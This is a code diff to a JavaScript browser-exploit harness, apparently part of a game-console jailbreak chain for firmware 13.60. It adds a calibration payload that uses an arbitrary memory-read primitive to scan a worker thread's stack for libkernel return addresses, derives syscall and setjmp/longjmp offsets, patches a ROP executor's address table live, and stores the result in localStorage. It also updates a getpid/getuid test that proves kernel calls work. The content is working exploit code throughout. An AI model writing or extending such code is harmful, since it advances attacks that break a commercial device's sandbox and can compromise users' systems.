@@ -48,7 +48,7 @@
     if (window.__BWP_LOADED) return;
     window.__BWP_LOADED = true;
 
-    var FW = window.fw_str || "?";
+    var FW = window.fw_str || (window.p && window.p.fw_str) || "?";
 
     /* ------------------------------------------------------------ errno */
 
@@ -300,7 +300,156 @@
         return ptr;
     }
 
-    /* ====================================================== the payloads */
+    /* ================================================ slot_expect calibration
+     *
+     * The 13.60 LK row's four text RVAs are EXTRAPOLATED (p2jb_lk.js group C), and the
+     * first console run proved slot_expect wrong: every call died in resolveSlot() with
+     * "parked slot (kbase+0x1983b) not found". Signature-scanning libkernel TEXT on the
+     * console is not possible -- the adapter documents that the libraries are xotext, so
+     * reading code through the R/W primitive faults and kills the process.
+     *
+     * But the parked worker STACK is readable data, and the parked frame contains the
+     * real return address INTO libkernel: exactly the qword resolveSlot() was scanning
+     * for. value - kbase IS the true slot_expect. And the other three text RVAs follow
+     * it at fixed deltas that are identical in both 12.x groups
+     *     12.00: sw-slot=+0x162C  setjmp-slot=+0x3BB8  longjmp-slot=+0x3C11
+     *     12.40: sw-slot=+0x162C  setjmp-slot=+0x3BB8  longjmp-slot=+0x3C11
+     * so one measured value calibrates the whole row. thread_list=0x6c218 needs no
+     * calibration -- find_worker() already succeeded on hardware with it.
+     *
+     * The executor holds the P2JB_LK row BY REFERENCE (p2jb_poops.js passes lk: row),
+     * so mutating the row's properties reaches W.lk live -- no re-init needed, and the
+     * next fireSync() picks the corrected values up.
+     *
+     * This tile writes NOTHING outside this JS process: every console touch is read64.
+     * The risk arrives with the NEXT tile (a derived syscall_wrapper/setjmp/longjmp that
+     * is wrong kills the WebProcess -- recoverable tab), which is why Identity must be
+     * the verdict, and why the measured row is persisted so a crash is attributable.
+     */
+    var CALIBKEY = "bwslop_lk_" + FW;
+    /* BigInt literals: they are ADDED to the measured slot_expect, and BigInt + number throws. */
+    var DELTAS = { syscall_wrapper: 0x162Cn, setjmp: 0x3BB8n, longjmp: 0x3C11n };
+
+    function loadCalib() {
+        try { var s = localStorage.getItem(CALIBKEY); return s ? JSON.parse(s) : null; } catch (e) { return null; }
+    }
+    function saveCalib(row) {
+        /* BigInt does not JSON-serialise -- store RVAs as strings. */
+        try { localStorage.setItem(CALIBKEY, JSON.stringify(row, function (k, v) { return typeof v === "bigint" ? v.toString() : v; })); } catch (e) { }
+    }
+    function applyCalib(row) {
+        var target = (window.P2JB_LK && window.P2JB_LK[FW]) || null;
+        if (!target) throw new Error("no P2JB_LK row to patch");
+        target.slot_expect = BigInt(row.slot_expect);
+        target.syscall_wrapper = BigInt(row.syscall_wrapper);
+        target.setjmp = BigInt(row.setjmp);
+        target.longjmp = BigInt(row.longjmp);
+        return target;
+    }
+
+    /* Read-only. Walks the same top-0x8000 window resolveSlot() scans, high->low, and
+     * collects every qword that points into libkernel text. WebKit return addresses
+     * (the WTF::Condition wrapper frames ABOVE the parked frame) are excluded by range,
+     * and each libkernel candidate is frame-validated the same way resolveSlot()
+     * validates: cond_wait's callee pushes rbp first, so the qword at candidate-8 must
+     * be a stack address above the candidate and inside this stack. */
+    function scanStackForKernelPtrs() {
+        var st = window.rop_worker.state;
+        if (!st.stack && window.rop_worker.findWorkerStack) {
+            try { var f = window.rop_worker.findWorkerStack(); if (f && f.stack) st.stack = f.stack; } catch (e) { }
+        }
+        if (!st.stack || !st.kbase) throw new Error("stack/kbase not resolved -- userland half incomplete");
+        var stack = B(st.stack), kbase = B(st.kbase);
+        var wbase = st.wbase ? B(st.wbase) : 0n;
+        var top = stack + 0x80000n, lo = top - 0x8000n;
+        var hits = [];
+        for (var a = top - 8n; a >= lo; a -= 8n) {
+            var v;
+            try { v = B(window.read64(a)); } catch (e) { continue; }
+            if (v < kbase + 0x1000n || v >= kbase + 0x200000n) continue;   // libkernel text only
+            if (wbase && v >= wbase && v < wbase + 0x8000000n) continue;   // not webkit frames
+            var rec = { addr: a, rva: v - kbase, validated: false, savedRbp: 0n };
+            try {
+                var rbp = B(window.read64(a - 8n));
+                if (rbp > a && rbp < top && (rbp & 7n) === 0n) { rec.validated = true; rec.savedRbp = rbp; }
+            } catch (e) { }
+            hits.push(rec);
+        }
+        return hits;
+    }
+
+    function pCalibrate() {
+        var st = (window.rop_worker && window.rop_worker.state) || null;
+        if (!st) { out("CAL-VERDICT", "rop_worker.state not reachable", "err"); return { ok: false, summary: "no state" }; }
+
+        /* Already working? Then the row was right and this is a no-op. */
+        if (st.slot && st.fired > 0) {
+            out("CAL-VERDICT", "executor already resolved its slot (slot=" + hex(B(st.slot))
+                + ") -- nothing to calibrate", "ok");
+            return { ok: true, summary: "already resolved" };
+        }
+
+        var t0 = Date.now();
+        var hits = scanStackForKernelPtrs();
+        out("CAL-SCAN", hits.length + " libkernel text pointer(s) in the worker stack top ("
+            + (Date.now() - t0) + "ms)", "dim");
+        if (!hits.length) {
+            /* Fall back to a previously measured row, if one survived in localStorage. */
+            var saved = loadCalib();
+            if (saved) {
+                try {
+                    applyCalib(saved);
+                    out("CAL-VERDICT", "scan found nothing; re-applied the persisted row (slot_expect="
+                        + hex(BigInt(saved.slot_expect)) + ", measured " + new Date(saved.ts).toISOString() + ")", "warn");
+                    return { ok: true, summary: "restored " + hex(BigInt(saved.slot_expect)) };
+                } catch (e) { out("CAL-VERDICT", "persisted row unusable: " + String((e && e.message) || e).slice(0, 60), "warn"); }
+            }
+            out("CAL-VERDICT", "no candidate found -- worker not parked where expected; nothing measured", "err");
+            return { ok: false, summary: "no candidates" };
+        }
+        for (var i = 0; i < hits.length; i++)
+            out("CAL-CAND", "stack+" + hex(hits[i].addr - B(st.stack)) + " -> libkernel+" + hex(hits[i].rva)
+                + (hits[i].validated ? "  [live frame: saved rbp=stack+" + hex(hits[i].savedRbp - B(st.stack)) + "]"
+                                     : "  [no frame validation]"),
+                hits[i].validated ? "ok" : "warn");
+
+        /* Preference order is resolveSlot()'s own: the HIGHEST frame-validated match,
+         * else the highest raw match (hits are already highest-first). With more than
+         * one candidate and none validated, say the pick is a guess instead of a fact. */
+        var pick = null;
+        for (var j = 0; j < hits.length; j++) { if (hits[j].validated) { pick = hits[j]; break; } }
+        if (!pick) pick = hits[0];
+        if (hits.length > 1 && !pick.validated)
+            out("CAL-VERDICT", "AMBIGUOUS -- " + hits.length + " candidates, none frame-validated; the highest is a guess", "warn");
+
+        var slotExpect = pick.rva;
+        var row = {
+            slot_expect: slotExpect,
+            syscall_wrapper: slotExpect + DELTAS.syscall_wrapper,
+            setjmp: slotExpect + DELTAS.setjmp,
+            longjmp: slotExpect + DELTAS.longjmp,
+            ts: Date.now(),
+            via: pick.validated ? "stack-scan+rbp" : "stack-scan",
+            candidates: hits.length,
+        };
+        try { applyCalib(row); } catch (e) {
+            out("CAL-VERDICT", "measured but could not apply: " + String((e && e.message) || e).slice(0, 70), "err");
+            return { ok: false, summary: "apply failed" };
+        }
+        saveCalib(row);
+        var guess = 0x1983B;
+        var diff = slotExpect >= guess ? (slotExpect - guess) : (guess - slotExpect);
+        out("CAL-MEASURED", "slot_expect=" + hex(BigInt(slotExpect))
+            + "  (the extrapolated guess " + hex(BigInt(guess)) + " was off by "
+            + (slotExpect >= guess ? "+" : "-") + "0x" + diff.toString(16) + ")", "ok");
+        out("CAL-DERIVED", "syscall_wrapper=" + hex(BigInt(row.syscall_wrapper)) + " setjmp=" + hex(BigInt(row.setjmp))
+            + " longjmp=" + hex(BigInt(row.longjmp)) + "  (fixed 12.x-group deltas)", "dim");
+        out("CAL-VERDICT", "row patched live; thread_list stays 0x6c218 (hardware-verified). "
+            + "Run Identity now: a plausible getpid PROVES the calibrated row.", "ok");
+        chip(elVerdict, "", "slot_expect " + hex(BigInt(slotExpect)));
+        notify("bagagwa: slot_expect measured " + hex(BigInt(slotExpect)) + " on " + FW);
+        return { ok: true, summary: "slot_expect " + hex(BigInt(slotExpect)) };
+    }
 
     /* T1 -- the identity family. p2jb's own preflight uses exactly this set to prove the
      * libkernel call path, and it is the cheapest positive control there is: if these come
@@ -318,7 +467,7 @@
         var ok = r.filter(function (x) { return x.ok; }).length;
         notify("bagagwa T1 identity " + ok + "/6" + (r[0].ok ? " pid=" + hex(r[0].ret) : ""));
         if (ok === 0) {
-            out("T1-VERDICT", "no call returned -- read the RW-* beacons: the executor did not start", "err");
+            out("T1-VERDICT", "no call returned -- if RW-SLOT beacons said 'not found', run Calibrate LK row, then Identity again", "err");
             return { ok: false, summary: "0/6" };
         }
         out("T1-VERDICT", ok + "/6 answered. uid=" + hex(r[2].ret) + " (0 or 1 at browser privilege, NOT 0x3ff)", "ok");
@@ -516,6 +665,11 @@
     /* ============================================================ the menu */
 
     var PAYLOADS = [
+        {
+            id: "calibrate", label: "Calibrate LK row", run: pCalibrate,
+            desc: "Read-only. Measures the REAL slot_expect from the parked worker stack (the "
+                + "extrapolated 13.60 value was wrong) and patches the row live. Run this first.",
+        },
         {
             id: "identity", label: "Identity", run: pIdentity,
             desc: "getpid / getuid / getgid family. The positive control: if this answers, the "
